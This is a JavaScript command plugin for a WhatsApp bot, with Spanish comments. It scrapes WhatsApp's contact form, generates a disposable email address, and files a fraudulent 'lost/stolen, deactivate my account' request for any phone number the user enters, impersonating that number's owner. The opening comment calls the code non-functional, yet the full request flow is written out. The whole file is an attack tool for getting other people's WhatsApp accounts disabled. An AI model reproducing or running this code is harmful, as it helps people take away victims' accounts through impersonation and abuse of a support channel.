/*codigo adaptado pero no funcional por restricciones de whatsapp*/


import cheerio from "cheerio";
import axios from "axios";
import util from "util";

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
  const q = args.join(" ");
  
  if (!q || !args[0]) {
    m.reply('*[🍀] INGRESE EL NÚMERO QUE DESEE DESACTIVAR EN FORMATO INTERNACIONAL, EJEMPLO: +1 (450) 555-555*');
    return;
  }
  
  try {
    // Obteniendo los datos de la página de contacto de WhatsApp
    const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/", {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
      }
    });

    const cookie = ntah.headers["set-cookie"]?.join("; ");
    if (!cookie) throw new Error("No se pudieron obtener las cookies.");

    // Generando correo aleatorio
    const emailResponse = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
    const email = emailResponse.data?.[0];
    if (!email) throw new Error("No se pudo generar un correo electrónico válido.");

    // Extrayendo el formulario y sus valores
    const $ = cheerio.load(ntah.data);
    const $form = $("form");
    if (!$form.length) throw new Error("No se encontró el formulario en la página.");
    
    const jazoest = $form.find("input[name=jazoest]").val();
    const lsd = $form.find("input[name=lsd]").val();
    const formAction = $form.attr("action");
    if (!jazoest || !lsd || !formAction) throw new Error("Valores ocultos del formulario no encontrados.");

    // Construyendo la URL para el formulario
    const url = new URL(formAction, "https://www.whatsapp.com").href;

    // Preparando los datos para enviar el formulario
    const form = new URLSearchParams({
      jazoest,
      lsd,
      step: "submit",
      country_selector: "ID",
      phone_number: q,
      email,
      email_confirm: email,
      platform: "ANDROID",
      your_message: `Perdido/roubado: desative minha conta: ${q}`,
      __user: "0",
      __a: "1",
      __csr: "",
      __req: "8",
      __hs: "19316.BP:whatsapp_www_pkg.2.0.0.0.0",
      dpr: "1",
      __ccg: "UNKNOWN",
      __rev: "1006630858",
      __comment_req: "0"
    });

    // Realizando la petición POST
    const res = await axios.post(url, form, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Referer": "https://www.whatsapp.com/contact/noclient/",
        "Origin": "https://www.whatsapp.com",
        "Cookie": cookie,
        "Content-Type": "application/x-www-form-urlencoded"
      }
    });

    // Procesando la respuesta
    const payload = String(res.data);

    if (payload.includes(`"payload":true`)) {
      m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica.\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`);
    } else if (payload.includes(`"payload":false`)) {
      m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`);
    } else {
      try {
        const parsedData = JSON.parse(res.data.replace("for (;;);", ""));
        m.reply(util.format(parsedData));
      } catch (e) {
        console.error('Error al procesar la respuesta:', res.data);
        m.reply('Hubo un error al procesar la respuesta de WhatsApp.');
      }
    }
  } catch (error) {
    console.error('Error en el handler:', error.response?.data || error.message);
    m.reply(`Error: ${error.response?.data || error.message || "No se pudo completar la solicitud."}`);
  }
};

handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i;
handler.rowner = true;
handler.tags = ['owner'];

export default handler;